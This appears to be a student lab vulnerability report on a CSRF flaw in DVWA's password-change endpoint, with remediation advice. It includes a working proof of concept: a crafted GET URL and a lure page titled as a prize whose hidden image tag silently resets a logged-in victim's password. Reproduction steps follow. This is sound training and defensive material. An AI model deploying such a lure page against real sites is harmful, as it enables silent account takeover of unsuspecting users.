CVE-ID: EDU-WEBLAB-2026-T02-10

Title:   Cross-Site Request Forgery in Password Change Function Allowing Unauthorized Credential Modification

Affected Lab:   DVWA — CSRF Lab

Component:   Password-Change Endpoint — DVWA CSRF Module (`/vulnerabilities/csrf/`)

Severity:   High

CVSS Vector:   CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

CVSS Score:   8.8

Description:  
A high-severity Cross-Site Request Forgery (CSRF) vulnerability exists in the password-change functionality of the DVWA CSRF module, where the application processes credential-modification requests via unauthenticated GET parameters without requiring a CSRF token, Origin/Referer validation, or session re-authentication. The endpoint accepts `password_new` and `password_conf` as plain GET parameters, meaning any crafted URL or hidden HTML element that causes an authenticated victim's browser to issue the request will silently change the account password using the victim's active session cookie. An attacker can distribute a malicious link or embed a hidden `<img>` tag on an attacker-controlled page, triggering the exploit the moment a logged-in victim visits the page — requiring no further interaction. Successful exploitation grants the attacker full control over the victim's account, including administrative access, leading to complete confidentiality and integrity compromise of the application and locking the legitimate user out entirely, constituting a high availability impact. The combination of GET-based state-changing actions, absence of anti-CSRF tokens, and lack of any user confirmation step makes this vulnerability trivially exploitable with no specialized tooling.

Proof of Concept:  
```http
   Direct crafted GET request — exploitable by pasting URL into any authenticated browser tab:
GET /vulnerabilities/csrf/?password_new=test1234&password_conf=test1234&Change=Change HTTP/1.1
Host: <target-ip>
Cookie: PHPSESSID=<victim-session-id>; security=low

   Server response confirming silent password change:
   "Password Changed."
```
```html
<!-- Malicious HTML page hosted on attacker-controlled server.
     The victim's browser auto-issues the GET request on page load
     via the <img> tag — no click required. -->
<!DOCTYPE html>
<html>
<head><title>You've won a prize!</title></head>
<body>
<h1>Congratulations! Click below to claim your reward.</h1>

<!-- Hidden CSRF trigger — fires automatically on page load -->
<img src="http://<target-ip>/vulnerabilities/csrf/?password_new=test1234&password_conf=test1234&Change=Change"
       style="display:none;"
       alt="">
</body>
</html>
```
```text
   Post-exploitation verification:
   Username: admin
   Password: test1234
   → Successful login confirms unauthorized credential modification.
```

Steps to Reproduce:

1. Log in to the DVWA application at `http://<target-ip>/login.php` using valid credentials (e.g., `admin` / `password`) and confirm a session cookie (`PHPSESSID`) is set in the browser.
2. Navigate to the CSRF module at `http://<target-ip>/vulnerabilities/csrf/` and verify the password-change form is present and that DVWA Security Level is set to   Low  .
3. Without logging out, open a new browser tab and paste the following crafted URL directly into the address bar: `http://<target-ip>/vulnerabilities/csrf/?password_new=test1234&password_conf=test1234&Change=Change`
4. Press Enter and observe that the page returns   "Password Changed."   — confirming the server processed the state-changing GET request using the active session cookie, with no CSRF token or confirmation required.
5. To simulate a realistic social-engineering attack, host the malicious HTML page (see Proof of Concept) on an attacker-controlled server and send the URL to the victim.
6. While still authenticated as the victim in another tab, visit the attacker-controlled page and observe that the hidden `<img>` tag silently triggers the password-change request without any visible user interaction.
7. Intercept the outgoing request using Burp Suite to confirm that no anti-CSRF token, `Origin` validation, or `Referer` check is present in the request or enforced by the server.
8. Log out of the DVWA application completely, then attempt to log back in using the original credentials (`admin` / `password`) — confirm that authentication fails, demonstrating the password was successfully overwritten.
9. Log in using the attacker-set credentials (`admin` / `test1234`) to confirm full, unauthorized account takeover and demonstrate complete exploitation of the vulnerability.

Remediation:

1.   Implement synchronizer CSRF tokens for all state-changing requests:   Generate a unique, cryptographically random, per-session token and embed it as a hidden field in every form. Validate this token server-side on every POST request; reject any request where the token is absent, incorrect, or expired.
2.   Migrate the password-change operation from GET to POST exclusively:   State-changing actions must never be triggered via GET requests, as GET parameters are trivially embeddable in URLs, `<img>` tags, and `<link>` elements. Enforce HTTP method validation server-side and reject GET requests to the endpoint.
3.   Validate `Origin` and `Referer` headers server-side:   Check that incoming requests to sensitive endpoints originate from the application's own trusted domain. Reject requests where the `Origin` or `Referer` header is absent, mismatched, or points to an external domain.
4.   Require re-authentication before credential changes:   Force the user to supply their current password before any password-change operation is accepted. This ensures that even if a CSRF request is issued, it cannot succeed without the victim's existing credentials.
5.   Implement the `SameSite=Strict` or `SameSite=Lax` cookie attribute:   Configure all session cookies with `SameSite=Strict` to prevent the browser from including cookies in cross-site requests, eliminating the attack vector at the browser level regardless of endpoint configuration.
6.   Display a server-rendered confirmation step before applying credential changes:   Require the user to explicitly confirm the password change on a separate page before the operation is committed, preventing silent, one-request exploitation.
7.   Deploy a Content Security Policy (CSP) and anti-clickjacking headers:   Set `X-Frame-Options: DENY` and a strict `Content-Security-Policy` header to prevent the application from being embedded in attacker-controlled frames or pages that could be used as CSRF delivery mechanisms.
8.   Implement security event logging and anomalous change alerting:   Log all password-change events with timestamp, source IP, and session identifier. Configure real-time alerts for password changes that occur without a preceding login event or from unexpected IP ranges, enabling rapid detection of CSRF-based account takeover attempts.

Discovered By:   Team 2

Date:   March 6, 2026

